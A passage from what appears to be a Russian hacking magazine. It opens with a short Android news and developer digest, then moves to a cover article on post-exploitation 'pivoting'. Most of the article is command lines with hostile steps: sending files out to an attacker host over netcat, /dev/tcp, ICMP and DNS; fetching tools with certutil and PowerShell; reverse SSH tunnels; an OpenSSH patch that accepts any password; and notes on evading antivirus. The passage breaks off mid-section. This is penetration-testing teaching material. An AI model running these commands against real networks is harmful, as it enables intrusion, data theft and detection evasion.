потому что SMS‐шлюзы блокиру ют исключительно цифровые Sender ID.
  И здесь на помощь приходит баг Android. Дело в том, что где‐то в коде
обработки SMS‐сооб щений в Android есть парсер, который при интерпре‐
тации буквенно‐цифрового Sender ID прос то отбра сывает буквы и пытается
интерпретировать это поле как номер телефона. Так, если Sender ID будет
равен 7890X123456, парсер отбросит X и добавит к получившемуся номеру
цифровой префикс (у автора — +44), получив в итоге +447890123456. Если
в телефоне есть контакт с таким номером, сообщение будет интерпретиро‐
вано как отправленное этим контактом.
  Интересно, что Google проигнориро вала сообщение об уяз вимости, ска‐
зав, что Sender ID так или ина че не предоставляет никаких гарантий и может
быть легко подделан:



      There are no guarantees regarding the sender ID of SMS messages,
      and they are known to be spoofable.





                     Демонстрация атаки


Android 11 и блокировка сторонних камер
Android 11 blocks third‐party camera apps from appearing in image/video picking
intents — небольшая заметка о том, почему и как Android 11 будет блокиро‐
вать сторонние приложения‐камеры для доступа из других приложений.
   Краткая предыстория: Android предос тавляет раз работчикам два варианта
получения доступа к камере: использовать стандартный API Camera2 либо
отправить специальное сооб щение (интент) с просьбой запустить стороннее
приложение для получения снимка. Во втором слу чае система автоматически
запустит дефолтовое приложение для съемки или покажет диалог выбора
приложения, если настройка дефолтового приложения была сброшена (нап‐
ример, после установки нового приложения‐камеры или при первом исполь‐
зовании).
  Начиная с Android 11 сис тема будет исключать из этого диалога приложе‐
ния, установленные из маркета или других источников. Сделано это для борь‐
бы со зловредными приложениями, которые могут отправлять сделанные
пользователем снимки на сторону. Одна ко у раз работчиков остается воз‐
можность запустить кон кретное приложение‐камеру напрямую.
  Список интентов, на которые распространяется ограниче ние:
 • android.media.action.VIDEO_CAPTURE;
 • android.media.action.IMAGE_CAPTURE;
 • android.media.action.IMAGE_CAPTURE_SECURE.


              РАЗРАБОТЧИКУ


Новые Java API в старых версиях Android
Support for newer Java language APIs — статья о том, как Android Studio
4.0 и новый плагин Android Gradle поз воляют использовать новейшие API Java
в старых версиях Android.
  Новая функция называется desugaring и входит в сос тав компилятора D8.
На деле это не что иное, как включение новых API Java в само приложение.
Компилятор проверяет все используемые приложением стандартные классы
Java и, если эти классы недос тупны во всех версиях Android, поддерживаемых
приложением, включает эти классы в код приложения.
  Для активации новой возможности необходимо установить Android Gradle
plugin 4.0 и добавить следующие строки в файл build.gradle приложения:


compileOptions {
    coreLibraryDesugaringEnabled true
    sourceCompatibility JavaVersion.VERSION_1_8
    targetCompatibility JavaVersion.VERSION_1_8
}


kotlinOptions {
    jvmTarget = "1.8"
}


dependencies {
    coreLibraryDesugaring 'com.android.tools:desugar_jdk_libs:1.0.10'
}

Теперь в приложении можно использовать java.time — новый потокобезо‐
пасный API для работы со временем, java.util.streams — API для работы
с коллекциями в функциональном стиле, доработанные классы из пакета
java.util.concurrent и другие API.


Отзывы о приложении внутри приложения
Leverage the In‐App Review API for your Google Play reviews — статья разработ‐
чиков Android о дол гожданной функции биб лиотеки Play Core Library под наз‐
ванием in‐app review API.
   In‐app review API поз воля ет раз работчикам показать экран оценки при‐
ложения прямо в собственном приложении и не отправлять пользователя
в Play Store. Все примеры кода опубликованы в специальном репозитории.
   API крайне простой. Дос таточно подключить библиотеку Play Core:


implementation 'com.google.android.play:core:1.8.0'
implementation 'com.google.android.play:core‐ktx:1.8.0'

И вызвать окно оцен ки из suspend‐функции:


val reviewManager = ReviewManagerFactory.create(context)
val reviewInfo = reviewManager.requestReview()
reviewManager.launchReview(context, reviewInfo)





                 Окно отзыва внутри приложения


Опасность оператора Elvis
Hidden pitfalls when using Elvis operator — небольшая заметка о подводных
камнях, которые может таить оператор Elvis (?:) в Kotlin.
   Благодаря null safety Kotlin позволяет писать лаконичный и понятный код
для обработки значений null. Например, проверить значение переменной
data на null и выполнить определенный код, если ее значение не null, можно
при помощи такой конструкции:


data?.let { updateData(data) }

Используя оператор Elvis, этот код можно дополнить условием else:


data?.let { updateData(data) } ?: run { showLoadingSpinner() }

Может показаться, что этот код делает то же самое, что и следующий:


if (data != null) {
   updateData(data)
} else {
   showLoadingSpinner()
}

Но это не так. Последний пример кода пол ностью бинарный: либо первый
блок, либо второй. А вот в предыдущем фрагменте кода могут быть выпол‐
нены оба блока! Это возможно, если функция updateData(data) сама вер‐
нет null. Тогда все выражение слева вернет null и будет выполнен код справа
от оператора Elvis.


Удобный способ отследить вывод на экран клавиатуры
When the keyboard meets Coroutines — статья о том, как отреагировать
на показ клавиатуры.
   API для отслеживания текущего сос тояния клавиатуры появил ся только
в Android 11. В более ранних версиях Android нет механизма, чтобы узнать,
когда клавиатура выведена на экран или исчезла с экрана. Но есть механиз‐
мы, позволяющие определить, что изменился раз мер опре деленного View.
  Один из этих механизмов — View.OnLayoutChangeListener, который выпол‐
няется, когда размер View меня ется. Используя его, а также корутины Kotlin,
можно написать suspend‐функцию, которая будет блокироваться ровно
до того момента, пока размер View не ста нет мень ше прежнего:


suspend fun View.awaitsLayoutReductionInY() =
suspendCancellableCoroutine<Unit> { cont ‐>
    val listener = object : View.OnLayoutChangeListener {
        override fun onLayoutChange(view: View?, left: Int, top: Int,
right: Int, bottom: Int, oldLeft: Int, oldTop: Int, oldRight: Int,
oldBottom: Int) {
            if (oldBottom != 0 && bottom < oldBottom) {
                view?.removeOnLayoutChangeListener(this)
                cont.resume(Unit)
            }
        }
    }
    cont.invokeOnCancellation { removeOnLayoutChangeListener(listener
) }
    addOnLayoutChangeListener(listener)
}

Эту функцию можно использовать, что бы показать клавиатуру и выполнить
определенное действие сра зу пос ле ее показа:


private fun openKeyboardAndRearrangeTheView() {
    lifecycleScope.launch {
        editText.openKeyboard()
        view.awaitsLayoutReductionInY()
        imageView.changeMargins()
    }
}


Как ускорить сборку на 40%
Disabling Jetiﬁer — небольшая заметка о том, как ускорить повторную сборку
приложения на 40%, отказавшись от одного из этапов сборки.
   Речь идет о Jetiﬁer — инс тру менте, который Android Studio запускает
во время сборки приложения. Его задача — обеспечить совместимость уста‐
ревшего кода, написанного с использованием support‐биб лиотек, с новым
кодом, использующим компоненты Jetpack. По сути, он просто заменя ет име‐
на импортируемых пакетов, превращая стро ки типа import android.sup‐
port.v7.widget.AppCompatImageView в import androidx.appcompat.wid‐
get.AppCompatImageView.
  В подавляющем большинс тве случаев этот этап необходим, потому что
проект может использовать множес тво уста ревших библиотек, все еще при‐
вязанных к support‐библиотекам. Проблема только в том, что, если в проекте
таких библиотек нет, Jetiﬁer все равно будет запущен и отнимет солидный
кусок времени сбор ки.
  Отключить Jetiﬁer можно, убрав строку android.enableJetifier=true
из файла gradle.properties. Но что, если ты не знаешь, какие зависимости
до сих пор исполь зуют support‐библиотеки? Узнать это поз волит Gradle‐пла‐
гин Can I Drop Jetiﬁer.
  Добавь его в build.gradle про екта:


plugins {
  id "com.github.plnice.canidropjetifier" version "0.5"
}

И запусти такую команду из каталога проекта:


./gradlew ‐Pandroid.enableJetifier=false canIDropJetifier

На экране появится список устаревших зависимостей. Если какие‐то из них
обновить нельзя, их придется сконвертировать в «новый формат» вручную:


./jetifier‐standalone ‐i <source‐library> ‐o <output‐library>

Эта команда принимает на вход AAR‐файл биб лиотеки и выдает на выход
исправленный вариант.


             ИНСТРУМЕНТЫ


 • Medusa — фреймворк для динамичес кого ана лиза при ложений (с функци‐
   ей отклю чения упаковщиков);
 • PathSecurityProvider — скрипт для патчинга приложений с целью дампа
   приватных зашифрованных данных.


              БИБЛИОТЕКИ


 • Copper — обертка к ContentObserver, представляющая данные в виде
    Kotlin coroutines Flow или RxJava Observable;
 • CodeView — view для соз дания редакторов кода;
 • Toaster‐Android — библиотека для создания красивых Toast‐сообщений;
 • Kiel — удобный адаптер для RecyclerView;
 • Satchel — удобная библиотека для хра нения данных ключ:значение;
 • MaterialResideMenu — анимированное боковое меню;
 • NeumorphismView — библиотека, делающая любые View выпуклыми;
 • Tempo — библиотека для удоб ной работы с датами;
 • Turbine — библиотека для тестирования Koltin coroutines Flow;
 • GraphView — view, показывающий графики;
 • Scrcast — библиотека для записи экра на;
 • Audioswitch — библиотека для управления аудиовходами/выходами;
 • MVFlow — MVI‐фреймворк на базе Kotlin coroutines Flow.
COVERSTORY
   КУНГ-ФУ
   PIVOTING

       ВЫЖИМАЕМ МАКСИМУМ
       ИЗ ПОСТЭКСПЛУАТАЦИИ





Pivoting, как ни стран но, не имеет никако го
отношения  к распитию  пива. Это один
из этапов взлома, когда атакующий создает
для себя точку опоры в скомпрометирован‐
ной системе, плацдарм для дальнейшего               s0i37                                                                                              Senior offensive security re‐
проникновения.  О  приемах,   которые         OSCP|OSCEsearcher in USSC.holder.
для  этого  применяются,  мы  сегодня              s0i37@ya.ru
и поговорим.


Во многом постэксплуатация похожа на «экс тремальное администрирова‐
ние» и мало связана с информа ционной безопас ностью. Но без этого этапа
не обходится ни один взлом, иначе он попросту лишен смысла. В целом
постэксплуатация обычно включает такие пос ледова тельные шаги:
 • evasion, обход антивируса;
 • persistence, закрепление (регистра ция в автозагрузке, создание службы
   и так далее);
 • pivoting, организация дос тупа, точки опоры;
 • privilege escalation, повышение привилегий;
 • gathering, сбор данных (паролей, документов и про чего);
 • lateral movement, горизонтальное перемещение (получение доступа к дру‐
   гим хостам);
 • прочие мероприятия для управления скомпрометированной ОС (получе‐
   ние GUI, установка кейлоггеров, сканирование портов);
 • заметание сле дов (очис тка логов, уда ление соз данных файлов).

Порядок шагов каждый раз может быть разным, некоторые из них могут и вов‐
се отсутствовать. Например, тот же самый pivoting нужен далеко не всегда.
Каждый из этапов впол не заслуживает отдельной статьи, но сегодня мы
поговорим исключительно о pivoting’е.
   Pivoting направлен главным обра зом на обход сетевых экранов или прочих
помех передаче данных между атакующим и жертвой, таких как фильтрация
портов или NAT. И решать подобные проблемы можно не только пробросом
портов или туннелированием. Орга низация GUI в среде Windows также может
стать серьезной проб лемой, так как некото рые программы не имеют кон‐
сольного интерфейса.
  С pivoting’ом можно столкнуться на любом эта пе атаки — от проник‐
новения во внутреннюю сеть, когда нужно преодолеть ограничения DMZ,
до того момента, когда уже получены права администратора домена и нужно
добраться до особо охраняемой локальной сети. Будем стараться исполь‐
зовать наименее подозритель ные приемы, чтобы нас не спалили антивирусы,
и при этом и наибо лее универ сальные — встро енные команды или портатив‐
ный софт. Рассмотрим раз ные случаи pivoting’а — с правами администратора
и без. Как обычно, на атакующей стороне используем Linux.


             INFO

                  •Символом # отмечены  случаи,  когда необ‐
                       ходимы административные права на скомпро‐
                        метирован ной ОС.
                  •Символом $ — случаи, когда возможен запуск
                        без прав администратора.



ПЕРЕДАЧА ФАЙЛОВ (ИНФИЛЬТРАЦИЯ И ЭКСФИЛЬТРАЦИЯ)
Первая проблема, с которой атакующий сталкива ется на этапе pivoting’а, —
это передача файлов. Порой нужно залить на удаленный хост эксплоит под‐
нятия привилегий, скачать какой‐либо документ, дамп памяти, поднять прок‐
си‐сервер,  наконец. Специфика  переда чи  данных  обусловлена  необ‐
ходимостью выпол нить ее исключительно базовыми средс твами ОС. Тут есть
несколько вариантов.


Эксфильтрация через TCP
Классическая передача файлов c помощью netcat выглядит так:


attacker> nc victim 1234 < file
victim$> nc ‐nv ‐lp 1234 > file

То же самое, но обратное соединение:


attacker> nc ‐nv ‐lp 1234 < file
victim$> nc attacker 1234 > file

Метод главным образом ориентирован на  Linux. Однако даже на Linux
не всегда присутствует  netcat. В таком случае можно передать файлы
с использованием bash:


attacker> nc ‐nv ‐lp 1234 < file
victim$> exec 3<> /dev/tcp/10.0.0.1/1234
victim$> cat <&3 > file

Разумеется, мы можем выполнить переда чу файлов и в обратном порядке —
от victim к attacker.


Эксфильтрация через SMB
Самый простой вариант передачи файлов под Windows. Для быстрого запус‐
ка SMB‐сервера используем Python‐пакет impacket:


attacker> sudo smbserver.py ro /usr/share/windows‐binaries/
victim$> copy \\attacker\r o\nmap.exe


Эксфильтрация через HTTP
А это — самый простой вариант переда чи файлов под Linux. Для быстрого
старта веб‐сервера в текущей папке используем встроенный модуль Python:


attacker> python ‐m SimpleHTTPServer 8080
victim$> wget http://attacker/socat ‐O /tmp/socat

Часто HTTP — единственное окно в мир из DMZ, и в Windows тоже приходится
им пользоваться, причем разными спо собами. Наиболее универсальный,
но не самый красивый метод выглядит так:


victim$> hh.exe http://attacker/nmap.exe.txt
victim$> cd \u sers\v ictim\appdata\l ocal\microsoft\windows\
victim$> dir /s nmap.exe*
victim$> cd путь_до_папки
victim$> move nmap.exe[1].txt nmap.exe

Этот способ подразумевает отправку файла любого содержимого, но с рас‐
ширением .txt. Если на уда ленном хос те установлена Windows 7 или новее,
проще использовать PowerShell:


victim$> powershell ‐c (new‐object System.Net.WebClient).DownloadFile
('http://attacker/nmap.exe' ,'C:\users\victim\desktop\nmap.exe')

Кроме того, если на хос те крутится более‐менее свежая Windows 7, можно
использовать очень полезную утилиту, к которой мы чуть поз же вернемся
еще не раз:


victim$> certutil ‐urlcache ‐split ‐f http://attacker/nc.exe.txt nc.
exe.txt

Помимо описанных методов, существует еще несколько, включая загрузку
с помощью VBS или PowerShell, однако они более громоздки и используются
на практике нечасто.


Эксфильтрация с использованием FTP
Способ хорошо подходит для Windows в случаях, когда SMB‐порты фильтру‐
ются. Часто во внутренних сетях меж ду VLAN'ами админы фильтруют пор‐
ты 445/TCP, что добавляет атакующему проб лем. Избавиться от них можно
при помощи старого доб рого протоко ла FTP. Для запуска FTP‐сервера
в текущей папке используем Python‐пакет pyftpdlib:


attacker> sudo python ‐m pyftpdlib ‐p 21

Поскольку программа FTP интерактивная, на  victim потребуется создать
небольшой скрипт с командами:


victim$> echo open attacker 21 > ftp.txt
victim$> echo anonymous>> ftp.txt
victim$> echo pass>> ftp.txt
victim$> echo bin >> ftp.txt
victim$> echo GET nmap.exe >> ftp.txt
victim$> echo bye >> ftp.txt
victim$> ftp ‐s:ftp.txt

Обрати внимание: при передаче логина и пароля пробел отсутствует.


Эксфильтрация с помощью TFTP
Достаточно экзотический способ переда чи фай лов, однако упомянуть о нем,
наверное, стоит. Для запуска TFTP‐сервера можно использовать классичес‐
кий atftpd, а можно Python‐пакет ptftpd.


attacker> sudo ptftpd ‐p 69 eth0 .
victim#> pkgmgr /iu:TFTP; tftp.exe ‐i 10.0.0.10 GET nc.exe
victim$> tftp attacker get /nc


Эксфильтрация через ICMP
Если весь TCP запрещен, на помощь придет протокол ICMP. Этот метод под‐
ходит для эксфильтрации, то есть только для передачи данных в одну сто‐
рону — в сторону attacker. Под Linux это можно сделать относительно просто:


victim$> xxd ‐p ‐c 4 secret.bin | while read line; do ping ‐c 1 ‐p
$line attacker; done

В приведенном выше примере мы передаем толь ко 4 байта за один пакет.
Под Windows для этого используем PowerShell и любой из кучи готовых скрип‐
тов в интернете.


Эксфильтрация через DNS
Если дело дошло до DNS, значит, на ата куемом хосте фильтруется все.
Или почти все. Любая изолиро ванная внутренняя сеть как‐то взаимодейству‐
ет с внешним миром — с интернетом, например, для загрузки обновлений
или отправки электронной почты. Поэтому DNS почти всегда работает
на резолв внешних адресов. Очень час то никто не заморачивается составле‐
нием белого списка допус тимых доменов, так что мы получаем вполне
рабочий канал передачи данных в обе стороны.
  Для эксфильтрации и инфильтрации через DNS воспользуемся готовыми
скриптами. Здесь и во всех последующих разделах о DNS подразумевается,
что мы делегировали себе зону attacker.tk. Запус каем кастомный DNS‐
сервер:


attacker> sudo ./dns_upload.py ‐‐udp ‐‐file dnscat.exe

Запоминаем количество требуемых DNS‐запросов. Для загрузки файла
по DNS потребуется небольшой скрипт на VBS, так как он наиболее перено‐
симый и будет работать на любой Windows. Перед запус ком не забываем
скорректировать количество DNS‐запросов в цикле for. Запуск скрипта
выпол няется следующим образом:


victim$> cscript.exe dns_download.vbs

Несмотря на то что мы получили воз можность ска чать любой файл и можем
воспользоваться готовыми решениями вроде dnscat, бывает, что антивиру сы
портят жизнь, когда нужно всего лишь забрать какой‐нибудь дамп LSASS
со скомпрометированной машины. Поэто му используем аналогичные скрип‐
ты для эксфильтрации:


attacker> sudo ./dns_download.py ‐‐udp ‐‐file out.bin
victim$> cscript.exe dns_upload.vbs c:\p ath\t o\secret.bin attacker.tk

Под Linux действуем таким обра зом:


victim$> ./dns_download.sh attacker.tk 1080 /tmp/dnscat

Метод с DNS всем хорош, но для передачи больших файлов он довольно
медленный.


Эксфильтрация plaintext
Передать файлы в виде прос того текста возможно почти всегда. Как правило,
если у нас есть шелл, мы можем вставить в него достаточно большую порцию
данных, используя буфер обмена. При этом данные должны быть представ‐
лены в текстовой форме. Иногда слишком боль шие порции данных передать
невозможно. Поэтому в зависимости от раз мера передаваемого файла его
следует сначала разделить на куски необходимых размеров:


attacker> split ‐b $[1* 1024*1024] nmap.zip

В итоге получатся n файлов по 1 Мбайт (как в при мере), начинающиеся на x*.
В качестве метода трансформации будем использовать Base64:


attacker> base64 ‐w 0 < xaa > xaa.txt

Под Linux после завершения переда чи куски фай ла могут быть соединены
вместе:


victim$> for i in x*; do base64 < $i > $i.txt; done
victim$> cat x* .txt > nmap.zip

Готово, файл собран из кусочков. В Windows все не так просто и для решения
аналогичной задачи существу ют разные при емы. Вот классический способ,
подходящий для раритетных версий Windows:


attacker> wine exe2bat.exe someprog.exe commands.bat

Полученный на выходе bat‐файл — это готовые команды, полностью сос‐
тоящие из печатных символов. Для сборки из текстового представления (в
данном случае Hex) в исходный двоичный код используется встроенный ком‐
понент debug.exe, который присутству ет только в 32‐битных версиях Windows
от XP до 7 включительно.
  Более современный метод, работающий на Windows 7–10 и аналогичных
серверных редакциях Windows:


victim$> certutil ‐decode content_base64.txt nmap.exe

В каждом из упо мянутых случаев мы могли столкнуться с тем, что файл приш‐
лось порезать на несколько кус ков. Чтобы соб рать получившиеся двоичные
куски в один файл в Windows, нужно сделать следующее:


victim$> type xaa.bin xab.bin xac.bin > 1.exe

А если, наоборот, надо выгрузить с victim на attacker двоичные файлы боль‐
шого размера, например дамп памяти? Про ще всего порезать файл будет
с помощью 7zip (который не требует установки и может быть доставлен
на машину с помощью двух файлов: 7z.exe и 7z.dll):


victim$> 7z a ‐v1m out.7z hugefile.bin

Затем полученные бинарные куски могут быть закодированы в Base64:


victim$> certutil ‐encode 1.bin 1.txt

И переданы по соот ветствующему каналу.
   Итак, с проблемой дос тавки файлов разоб рались. Теперь мы можем
передать все необ ходимые программы, которые потребуются нам дальше.
Под Windows будем отдавать предпочтение portable‐версиям. Под Linux
предполагается исполь зовать  статически собранные программы,  чтобы
избежать проблем с версиями биб лиотек. Так как скомпрометированным
может быть не только сервер, но и какой‐нибудь роутер или иной девайс,
желательно иметь статичес ки собранные бинарники под раз ные архитектуры,
хотя бы самые популярные: x86, ARM и MIPS.


ПРОБРОС ПОРТОВ
Наверное, самое простое в pivoting’е — это пробросить куда‐нибудь порт.
Вариантов такого проброса дос таточно много. На самом деле для прос тых
пробросов портов будет дос таточно замечатель ной утилиты socat:


victim$> socat.exe tcp‐listen:4445,fork tcp‐connect:target:445





                     Простой проб рос портов

Программа socat, кстати, портирова на из Linux, поэтому там ее тоже можно
задействовать, используя абсолютно аналогичный синтаксис. Вооб ще, воз‐
можности socat гораздо шире, чем прос той редирект. К этой утилите мы
еще вернемся.
   Если на скомпрометированной машине у атакующего есть права админис‐
тратора или  root, то редирект можно выполнить средствами файрвола.
На Windows это делается так:


victim#> netsh interface portproxy add v4tov4 listenport= 4445
listenaddress=victim
connectport= 445 connectaddress=target

На Linux так:


victim#> iptables ‐t nat ‐A PREROUTING ‐p tcp ‐‐dport 4445 ‐j DNAT
‐‐to‐destination target:445


Local port forwarding
Говоря о пробросе портов, нельзя прой ти мимо SSH, который пред ставляет
собой достаточно гибкое решение и час то используется для этой цели.
На самом деле SSH выполняет не совсем обычный редирект. Он соз дает тун‐
нели, позволяя повторно использовать соединение — пробрасывать новое
сетевое соединение внут ри другого, уже уста новленного. Примечательно,
что и сервер, и клиент могут выступать в роли звена, выполняющего проб рос.
  Подразумеваем, что на victim запущен SSH‐сервер, вне зависи мос ти
от того, какая ОС там использует ся. Проб рос выполняется следующим обра‐
зом:


attacker> ssh ‐N user@victim ‐L 4445:target:445





              Проб рос портов с использованием SSH


Remote port forwarding
Remote port forwarding отличается от локального проброса лишь тем, что
сама процедура выполняется с SSH‐сервера. В этом случае направле ние
проброса будет противо положным установленно му SSH‐подключению.
  Remote port forwarding может пригодиться, если нужно организовать канал
эксфильтрации с victim через attacker. Например, чтобы установить нужные
пакеты, скачав их через прокси на изолированном от интерне та скомпро‐
метированном хосте. Но чаще Remote port forwarding применя ется, если
на victim не запущен SSH‐сервер или фильтру ется порт. В таком слу чае мы
можем все так же проб росить порт с attacker, но уже по инициати ве victim.
  Сперва запустим SSH‐сервер у себя и соз дадим фиктивную учетную
запись:


attacker> sudo /etc/init.d/ssh start
attacker> useradd ‐M ‐N ‐d /dev/null ‐s /bin/false proxy
attacker> passwd proxy

Чтобы неинтерактивно залогиниться по SSH, используем ключи:


victim$> chown user priv_key
victim$> chmod 0400 priv_key

А теперь создаем проброс по схеме back‐connect:


victim$> ssh ‐i priv_key proxy@attacker ‐N ‐R 4445:target:445 ‐o
StrictHostKeyChecking= no





                 Проб рос по схеме back‐connect

Подобный способ также поможет обойти файрвол или NAT. В Windows, где ты,
скорее всего, не встретишь SSH‐серверы, нам тоже придется использовать
Remote port forwarding, применив для это го портативный клиент:


victim> plink.exe ‐N ‐l proxy ‐pw passwd ‐R 4445:target:445 attacker
‐P 22

В итоге получаем конфигурацию, идентичную той, что показана на рисунке
выше. На картинке видно, что в случае c Local Port Forwarding роль проброса
играет клиент, а при Remote Port Forwarding — сервер.
  Работая с metasploit, мы также можем выполнять пробросы, используя
соединение между victim и attacker, то есть организовать туннелирование.
Чтобы построить туннель attacker:4445 → victim → target:445, делаем сле‐
дующее:


meterpreter> portfwd add ‐L 127.0.0.1 ‐l 4445 ‐r target ‐p 445

Для организации туннеля victim:6666 → attacker → target:8888 выпол няем
следующую команду:


meterpreter> portfwd add ‐R ‐L target ‐l 8888 ‐p 6666


Обход сразу двух файрволов
Атакующим часто приходится сталкиваться с хорошо изолированными VLAN,
когда attacker и victim находятся в разных сетях за файрволом или NAT и не
могут напрямую устанавливать соединения ни в ту, ни в другую сторону.





       Attacker и victim находятся в раз ных сетях за файрволом или NAT

Никакой reverse shell или SSH‐туннели нам тут не помогут. В качестве альтер‐
нативы можно организо вать дос туп на «третий» хост из дру гого VLAN,
на который оба могут инициировать TCP‐соединение.





            Организа ция соединения через третий хост

Найти такой хост обыч но не сос тавляет проблемы. Разумеется, этот самый
третий хост точно так же не может преодолеть файрвол и достучаться до at‐
tacker или victim. Для решения этой задачи исполь зуем следующий трюк:


third$> socat tcp‐listen:5555 tcp‐listen:6666
victim$> socat tcp‐connect:third:6666 tcp‐connect:target:22





    Организация соединения с использованием промежуточного хоста

Важно инициировать первое подключение к 5555/tcp, поскольку socat
выпол няет вторую половину операций с сокетами (tcp‐listen:6666) после
установки соединения tcp‐listen:5555. В итоге получается, что два вхо‐
дящих соединения связываются через pipe, и через этот pipe может пойти
трафик в обход сразу двух файрволов или NAT.





                   Схема обхо да фай рволов и NAT

В результате мы получили дос туп к порту 22 на машину target, которая пря‐
талась за файрволом.


                                     Продолжение статьи →
COVERSTORY            ← НАЧАЛО СТАТЬИ
    КУНГ-ФУ PIVOTING
                      ВЫЖИМАЕМ МАКСИМУМ
                       ИЗ ПОСТЭКСПЛУАТАЦИИ





dns2tcp
Теперь рассмотрим тяжелый, но все же доволь но характерный слу чай:
из скомпрометированной сети нет дос тупа в интернет. Придется снова
использовать DNS.
   Утилита dns2tcp имеет версии для Windows и Linux и использует похожий
на SSH синтаксис проброса портов. На серверной стороне  у  attacker
в dns2tcpdrc мы указыва ем следующие настройки:


listen = 1.2.3.4
port = 53
user = nobody
key = s3cr3t
chroot = /var/empty/dns2tcp/
domain = attacker.tk

Запускаем:


attacker> sudo ./dns2tcpd ‐F ‐d3 ‐f dns2tcpdrc

Копируем на victim клиентскую часть. Для проброса трафика по маршруту vic‐
tim:4444 →  attacker →  target:5555  запус каем  утилиту со следующими
параметрами:


victim$> dns2tcpc.exe ‐z attacker.tk ‐k s3cr3t ‐t 3 ‐L 4444:target:
5555 8.8.8.8

Для проброса по маршру ту attacker:4445 → victim → target:445 запус каем тул‐
зу так:


victim$> dns2tcpc.exe ‐z attacker.tk ‐k s3cr3t ‐t 3 ‐R 4445:target:
445 8.8.8.8

Теперь через данный туннель можно орга низовать прокси или пробросить
сессию meterpreter и забыть об отсутс твии интернета. Двигаемся дальше.


ПРОКСИРОВАНИЕ
Проброс портов име ет одно малень кое ограничение: это статическая опе‐
рация, и мы делаем отдельный проб рос для каждой связки ip:port. Как пра‐
вило, это нужно лишь на начальной стадии, чтобы обойти файрвол. Но если
надо организовать более полноценный и удоб ный доступ в сетевой сегмент
через скомпрометированную машину, используется прокси.


3proxy
В простых ситуациях нет ничего лучше, чем использовать 3proxy. Утилиты
из этого набора программ портативные, они не требуют установки и прав
администратора. Тулзы прекрасно работа ют как на Windows, так и на Linux
и легко кросс‐компилируются. Для запуска SOCKS прокси‐сервера исполь‐
зуются следующие коман ды (под Linux и Windows соот ветс твенно):


victim$> ./socks ‐d ‐p3128
victim$> socks.exe ‐d ‐p3128

Для запуска HTTP connect прокси‐сервера используются следующие коман‐
ды (под Linux и Windows соответственно):


victim$> ./proxy ‐d ‐p8080
victim$> proxy.exe ‐d ‐p8080

Если антивирус съел 3proxy, можно попробовать ути литу из набора Nmap:


victim$> ncat.exe ‐vv ‐‐listen 3128 ‐‐proxy‐type http

Если не помогло, то переходим к SSH.


SSH
Возвращаясь к SSH, нужно упо мянуть один упущенный ранее момент. Если
тебе не удалось получить привилегии root на скомпрометированной машине,
сразу же возникает ряд проблем. Во‐первых, мы дол жны знать пароль
от текущей учетки, который известен далеко не всегда. Во‐вторых, если SSH
не запущен, то его запуск пот ребует прав root. Все это, к счастью, можно
исправить следующим обра зом:


attacker> git clone https://github.com/openssh/openssh‐portable

Патчим функции, отвечающие за аутентифика цию:


int auth_shadow_pwexpired(Authctxt *ctxt){
    return 0;
}
int sys_auth_passwd(struct ssh *ssh, const char *password){
    return 1;
}

Теперь собираем тулзу — желательно статически, чтобы избежать проблем
с зависимостями:


attacker> autoreconf
attacker> LDFLAGS='‐static' ./configure ‐‐without‐openssl
attacker> make
attacker> ./ssh‐keygen

Слегка меняем конфиг sshd_config:


Port 2222
HostKey /path/to/here/ssh_host_rsa_key

Копируем и запускаем утилиту на victim:


victim$> $(pwd)/sshd ‐f sshd_config

Теперь SSH‐сервер сможет работать в роли прокси‐сервера без прав root
и залогиниться на него мы смо жем с любым паролем.
  На Windows, где сервер SSH обычно отсутс твует, можно использовать
freeSSHd, который будет работать в роли прокси‐сервера. Правда, для этого
нам все же потребуются пра ва администратора. FreeSSHd — это отличная
альтернатива 3proxy и meterpreter, когда анти вирус не дает запустить ничего
подозрительного.
   Рассмотрим типичный пример прохождения сетевого периметра. Вооб‐
разим, что получен доступ к серверу из DMZ. На такие серверы обычно проб‐
расываются только нужные порты, а значит, напрямую на прокси мы не под‐
клю чимся. Вспоминаем про туннелирование портов:


victim$> ssh ‐N proxy@attacker ‐R 2222:victim:22

Теперь attacker:2222 будет проб рошен на victim:22. Через этот туннель
мы организуем прокси:


attacker> ssh ‐ND 127.0.0.1:3128 127.0.0.1 ‐p2222

Если все прошло успешно, то на attacker появится SOCKS‐прокси на TCP‐
порте 3128. По сути, это туннель внутри туннеля.





          SOCKS‐прокси в качес тве «туннеля внутри туннеля»

Если проблем с антивирусами  нет, можно вос пользоваться  Metasploit,
это будет немного проще:


meterpreter> run autoroute ‐s 10.0.0.0/8
msf> use auxiliary/server/socks4a


Используем прокси
Чтобы использовать прокси на стороне ата кующего, мы можем:
 • указать в настрой ках конкретной программы адрес прокси  (тут есть
   минус — не все приложения поддерживают прокси);
 • принудительно проксировать любое приложение (это называется «сок‐
   сификация»).

Соксификацию можно орга низовать следующей командой:


attacker> proxychains nmap ‐sT ‐Pn ‐n 192.168.0.0/24

Этот вариант подходит почти для любого при ложения, даже для такого,
которое не поддерживает нас тройку прокси, так как подменяет библиотечные
вызовы connect(), send() и recv(). Одна ко и тут есть нюансы: проксирова‐
ние не поддерживают прог раммы, генерирующие пакеты через raw‐сокеты
или не использующие биб лиотеку libc (то есть ста тичес ки собранные).
  Кроме того, мы можем делать проз рачное проксирование, для чего
используется прок си redsocks. Для его нас тройки прописы ваем в /etc/red‐
socks.conf сле дующее:


local_ip = 127.0.0.1;
local_port = 12345;
ip = 127.0.0.1;
port = 3128;

После этого можно запустить прокси:


attacker> sudo iptables ‐t nat ‐A OUTPUT ‐p tcp ‐d 10.0.0.0/8 ‐j
REDIRECT —to‐ports 12345
attacker> sudo redsocks ‐c /etc/redsocks.conf
attacker> nmap ‐sT ‐Pn ‐n 10.0.0.0/24

Теперь можем напрямую посылать пакеты в интересу ющую нас сеть. Iptables
прозрачно для нас перехватит их и направит на redsocks, который, в свою
очередь, направит пакеты непосредс твенно на прокси‐сервер. Однако
использование  raw‐сокетов по‐прежнему недопустимо, потому  что они
генерируются за пределами iptables и маршрутиза ции.
   Проксирование все же имеет некоторые недостатки:
 • проксируются только уровни OSI выше чет вертого;
 • скорость новых соединений невысо ка — порты будут сканироваться мед‐
   ленно;
 • проксируются в основном TCP‐пакеты.

От всех этих проб лем нас избавит полноценный VPN‐туннель.


VPN-ТУННЕЛИ
VPN‐туннели призваны обеспечить атакующему пол ноценный дос туп во внут‐
реннюю сеть или изолированный VLAN и открыть возможность для даль‐
нейшего комфортного продвижения. Все примеры использования туннелей
требуют прав администратора или root.


VPN-туннель через TCP в одну команду (L3-туннель)
В Linux мы можем очень элегантно поднять туннель, не используя настра‐
иваемый VPN‐сервер:


